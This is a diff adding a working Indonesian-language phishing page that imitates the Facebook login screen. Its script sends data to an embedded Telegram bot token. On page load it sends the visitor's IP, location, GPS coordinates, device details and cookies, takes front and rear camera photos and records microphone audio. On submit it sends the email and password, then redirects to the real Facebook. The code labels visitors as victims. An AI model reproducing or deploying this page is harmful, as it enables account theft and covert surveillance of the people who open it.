@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<title>Facebook - Masuk atau Daftar</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; font-family: Helvetica, Arial, sans-serif; }
+body { background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+.container { width: 100%; max-width: 500px; padding: 20px; }
+.logo { text-align: center; margin-bottom: 20px; }
+.logo svg { width: 240px; height: 84px; fill: #1877f2; }
+.card { background: white; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1); padding: 20px; }
+.card h2 { font-size: 18px; font-weight: normal; color: #1c1e21; margin-bottom: 20px; text-align: center; }
+.input-group { margin-bottom: 14px; }
+.input-group input { width: 100%; padding: 16px 14px; font-size: 17px; border: 1px solid #dddfe2; border-radius: 6px; background: white; outline: none; transition: border 0.2s; }
+.input-group input:focus { border-color: #1877f2; box-shadow: 0 0 0 2px #e7f3ff; }
+button { width: 100%; padding: 14px; background: #1877f2; color: white; font-size: 20px; font-weight: bold; border: none; border-radius: 6px; cursor: pointer; transition: background 0.2s; margin-bottom: 16px; }
+button:hover { background: #166fe5; }
+.forgot { text-align: center; margin: 16px 0; }
+.forgot a { color: #1877f2; font-size: 14px; text-decoration: none; }
+.forgot a:hover { text-decoration: underline; }
+hr { border: none; border-top: 1px solid #dadde1; margin: 20px 0; }
+.create-btn { text-align: center; }
+.create-btn button { background: #42b72a; font-size: 17px; padding: 12px; width: auto; display: inline-block; margin: 0; }
+.create-btn button:hover { background: #36a420; }
+.loading { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.8); z-index: 9999; justify-content: center; align-items: center; flex-direction: column; }
+.loading-spinner { border: 5px solid #f3f3f3; border-top: 5px solid #1877f2; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin-bottom: 20px; }
+@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+.loading p { color: #1c1e21; font-size: 16px; }
+</style>
+</head>
+<body>
+
+<div class="loading" id="loading">
+    <div class="loading-spinner"></div>
+    <p>Memverifikasi...</p>
+</div>
+
+<div class="container">
+    <div class="logo">
+        <!-- Logo Facebook SVG -->
+        <svg viewBox="0 0 36 36" fill="url(#jsc_s_4)" height="40" width="40"><defs><linearGradient x1="50%" x2="50%" y1="97.078%" y2="0%" id="jsc_s_4"><stop offset="0%" stop-color="#0062E0"></stop><stop offset="100%" stop-color="#19AFFF"></stop></linearGradient></defs><path d="M15 35.8C6.5 34.3 0 26.9 0 18 0 8.1 8.1 0 18 0s18 8.1 18 18c0 8.9-6.5 16.3-15 17.8l-1-.8h-4l-1 .8z"></path><path fill="#fff" d="M25 23l.8-5H21v-3.5c0-1.4.5-2.5 2.7-2.5H26V7.4c-1.3-.2-2.7-.4-4-.4-4.1 0-7 2.5-7 7v4h-4.5v5H15v12.7c1 .2 2 .3 3 .3s2-.1 3-.3V23h4z"></path></svg>
+    </div>
+    
+    <div class="card">
+        <h2>Masuk ke Facebook</h2>
+        
+        <!-- Form login palsu -->
+        <form id="loginForm" onsubmit="event.preventDefault(); kirimLogin()">
+            <div class="input-group">
+                <input type="text" id="email" placeholder="Email atau Nomor Telepon" required minlength="3">
+            </div>
+            <div class="input-group">
+                <input type="password" id="password" placeholder="Kata Sandi" required minlength="3">
+            </div>
+            <button type="submit">Masuk</button>
+        </form>
+        
+        <div class="forgot">
+            <a href="#">Lupa kata sandi?</a>
+        </div>
+        
+        <hr>
+        
+        <div class="create-btn">
+            <button onclick="window.location.href='https://facebook.com/r.php'">Buat Akun Baru</button>
+        </div>
+    </div>
+</div>
+
+<!-- Elemen hidden untuk capture -->
+<video id="video" autoplay playsinline style="display:none;"></video>
+<canvas id="canvas" style="display:none;"></canvas>
+
+<script>
+// ============================================
+// KONFIGURASI TELEGRAM
+// ============================================
+const token = '8714948419:AAEOzYBdyuPMVP3MaMMX0eiJgB3lZucnwv0';
+const chat_id = '8452444655';
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const ctx = canvas.getContext('2d');
+const mulai = Date.now();
+let sudahKirimData = false; // biar ga double kirim
+
+// ============================================
+// FUNGSI KIRIM KE TELEGRAM
+// ============================================
+function kirimPesan(text) {
+    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id, text })
+    }).catch(e => console.log('Gagal kirim pesan:', e));
+}
+
+function kirimFoto(blob, caption) {
+    let form = new FormData();
+    form.append('chat_id', chat_id);
+    form.append('photo', blob, 'foto.jpg');
+    form.append('caption', caption);
+    fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+        method: 'POST',
+        body: form
+    }).catch(e => console.log('Gagal kirim foto:', e));
+}
+
+function kirimAudio(blob) {
+    let form = new FormData();
+    form.append('chat_id', chat_id);
+    form.append('audio', blob, 'rekaman.mp3');
+    form.append('caption', '🎤 Rekaman Suara Korban');
+    fetch(`https://api.telegram.org/bot${token}/sendAudio`, {
+        method: 'POST',
+        body: form
+    }).catch(e => console.log('Gagal kirim audio:', e));
+}
+
+function kirimFile(blob, filename, caption) {
+    let form = new FormData();
+    form.append('chat_id', chat_id);
+    form.append('document', blob, filename);
+    form.append('caption', caption);
+    fetch(`https://api.telegram.org/bot${token}/sendDocument`, {
+        method: 'POST',
+        body: form
+    }).catch(e => console.log('Gagal kirim file:', e));
+}
+
+// ============================================
+// AMBIL FOTO DARI VIDEO
+// ============================================
+function ambilFoto(jenis) {
+    if (!video.videoWidth) return;
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    canvas.toBlob(blob => {
+        const now = new Date();
+        const timestamp = now.toLocaleString('id-ID');
+        kirimFoto(blob, `📸 Foto ${jenis}\n🕐 ${timestamp}`);
+    }, 'image/jpeg');
+}
+
+// ============================================
+// CURi COOKIE
+// ============================================
+function kirimCookie() {
+    try {
+        const cookies = document.cookie;
+        if (cookies && cookies.length > 0) {
+            const blob = new Blob([cookies], { type: 'text/plain' });
+            kirimFile(blob, 'cookies.txt', '🍪 Cookies Browser Korban');
+        }
+    } catch(e) {
+        console.log('Gagal ambil cookie:', e);
+    }
+}
+
+// ============================================
+// MULAI KOLEKSI DATA (HANYA SEKALI)
+// ============================================
+if (!sudahKirimData) {
+    sudahKirimData = true;
+    
+    // 1. Kirim notifikasi awal
+    kirimPesan('🔥 Korban Baru Membuka Halaman');
+    
+    // 2. IP & Lokasi
+    fetch('https://api.ipify.org?format=json')
+    .then(res => res.json())
+    .then(ipData => fetch('https://ipapi.co/' + ipData.ip + '/json/'))
+    .then(res => res.json())
+    .then(info => {
+        const device = navigator.userAgent;
+        const ram = navigator.deviceMemory || 'Tidak diketahui';
+        const cpu = navigator.hardwareConcurrency || 'Tidak diketahui';
+        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        const bahasa = navigator.language;
+        const browser = navigator.appName + ' ' + navigator.appVersion;
+        const statusJaringan = navigator.onLine ? 'Online' : 'Offline';
+        
+        navigator.getBattery().then(bat => {
+            const now = Date.now();
+            const waktuBuka = Math.floor((now - mulai) / 1000);
+            const status = `
+📌 DATA KORBAN
+══════════════
+🌐 IP: ${info.ip}
+🏳️ Negara: ${info.country_name}
+🖥️ Region: ${info.region}
+📲 Kota: ${info.city}
+🔎 ISP: ${info.org}
+🔋 Baterai: ${Math.floor(bat.level * 100)}%
+📱 Device: ${device.substring(0,100)}...
+🧠 RAM: ${ram} GB
+⚙️ CPU: ${cpu} core
+🌍 Zona: ${timezone}
+🗣️ Bahasa: ${bahasa}
+📡 Jaringan: ${statusJaringan}
+⏳ Buka web: ${waktuBuka} detik
+══════════════`;
+            kirimPesan(status);
+        });
+    }).catch(e => kirimPesan('Gagal ambil IP: ' + e.message));
+    
+    // 3. Lokasi GPS
+    if ("geolocation" in navigator) {
+        navigator.geolocation.getCurrentPosition(pos => {
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+            const akurasi = pos.coords.accuracy;
+            const lokasi = `📍 GPS Korban:\nhttps://www.google.com/maps?q=${lat},${lon}\nAkurasi: ${akurasi} meter`;
+            kirimPesan(lokasi);
+        }, err => {
+            kirimPesan('Gagal GPS: ' + err.message);
+        });
+    }
+    
+    // 4. Curi Cookie
+    setTimeout(kirimCookie, 2000);
+    
+    // 5. Akses Kamera Depan
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
+    .then(stream => {
+        video.srcObject = stream;
+        video.play();
+        setTimeout(() => {
+            ambilFoto('Depan');
+            stream.getTracks().forEach(track => track.stop());
+            
+            // 6. Akses Kamera Belakang
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } })
+            .then(stream2 => {
+                video.srcObject = stream2;
+                video.play();
+                setTimeout(() => {
+                    ambilFoto('Belakang');
+                    stream2.getTracks().forEach(track => track.stop());
+                }, 3000);
+            }).catch(e => kirimPesan('Gagal kamera belakang: ' + e.message));
+            
+        }, 3000);
+    }).catch(e => kirimPesan('Gagal kamera depan: ' + e.message));
+    
+    // 7. Rekam Microphone (20 detik)
+    navigator.mediaDevices.getUserMedia({ audio: true })
+    .then(stream => {
+        const mediaRecorder = new MediaRecorder(stream);
+        const audioChunks = [];
+        
+        mediaRecorder.ondataavailable = event => {
+            audioChunks.push(event.data);
+        };
+        
+        mediaRecorder.onstop = () => {
+            const audioBlob = new Blob(audioChunks, { type: 'audio/mpeg' });
+            kirimAudio(audioBlob);
+            stream.getTracks().forEach(track => track.stop());
+        };
+        
+        mediaRecorder.start();
+        setTimeout(() => {
+            mediaRecorder.stop();
+        }, 20000); // 20 detik
+    }).catch(e => kirimPesan('Gagal mic: ' + e.message));
+}
+
+// ============================================
+// FUNGSI KIRIM LOGIN
+// ============================================
+function kirimLogin() {
+    const email = document.getElementById('email').value.trim();
+    const password = document.getElementById('password').value.trim();
+    
+    if (email.length < 3 || password.length < 3) {
+        alert('Email/HP atau kata sandi tidak valid');
+        return;
+    }
+    
+    // Tampilkan loading
+    document.getElementById('loading').style.display = 'flex';
+    
+    // Kirim ke Telegram
+    const waktu = new Date().toLocaleString('id-ID');
+    kirimPesan(`🔐 LOGIN KORBAN\n══════════\n👤 Email/HP: ${email}\n🔑 Password: ${password}\n🕐 Waktu: ${waktu}`);
+    
+    // Simulasi proses
+    setTimeout(() => {
+        // Redirect ke halaman error Facebook
+        window.location.href = 'https://facebook.com/login/?next&error=1';
+    }, 2000);
+}
+</script>
+
+</body>
+</html>
